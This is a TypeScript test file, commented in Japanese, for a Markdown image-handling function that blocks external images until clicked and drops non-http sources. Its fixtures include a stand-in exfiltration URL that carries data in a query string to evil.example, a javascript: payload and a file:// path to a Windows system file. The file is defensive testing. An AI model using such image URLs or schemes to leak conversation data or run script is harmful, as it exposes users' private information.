// Markdown の画像の扱い (src/lib/mdimages.ts) のテスト。`pnpm test` で実行する
import assert from "node:assert/strict";
import { test } from "node:test";
import { imagePlan } from "../src/lib/mdimages.ts";

const github = (rel: string) => `https://github.com/o/r/raw/HEAD/${rel}`;
const none = () => null;

test("imagePlan: 外の画像は、押すまで読み込まない", () => {
  // URL に文字を載せて外へ出す形 (会話の全文に混ざることがある)
  const leak = "https://evil.example/p.png?d=secret";
  assert.deepEqual(imagePlan(leak, none, false), { kind: "ask", url: leak, host: "evil.example" });
  assert.deepEqual(imagePlan("http://10.0.0.5:8080/x.gif", none, false), { kind: "ask", url: "http://10.0.0.5:8080/x.gif", host: "10.0.0.5:8080" });
  // 相対パスを解決できる README でも、絶対 URL は書いた人が決めた行き先なので同じ
  assert.equal(imagePlan("https://img.shields.io/badge/a-b-green", github, false).kind, "ask");
  // 押したあとは出す
  assert.deepEqual(imagePlan(leak, none, true), { kind: "show", url: leak });
});

test("imagePlan: 相対パスは、そのリポジトリ自身の URL にできるときだけ出す", () => {
  assert.deepEqual(imagePlan("docs/a.png", github, false), { kind: "show", url: "https://github.com/o/r/raw/HEAD/docs/a.png" });
  assert.deepEqual(imagePlan("docs/a.png", none, false), { kind: "drop" });
  assert.deepEqual(imagePlan("docs/a.png", none, true), { kind: "drop" });
});

test("imagePlan: http(s) 以外の行き先は、押したあとでも出さない", () => {
  for (const src of ["", "data:image/png;base64,AAAA", "file:///C:/Windows/win.ini", "javascript:alert(1)", "//evil.example/p.png", "C:\\Users\\x\\a.png"]) {
    assert.deepEqual(imagePlan(src, github, false), { kind: "drop" }, src);
    assert.deepEqual(imagePlan(src, github, true), { kind: "drop" }, src);
  }
  // 解決した先が http(s) でなければ出さない
  assert.deepEqual(imagePlan("a.png", () => "file:///C:/a.png", true), { kind: "drop" });
});
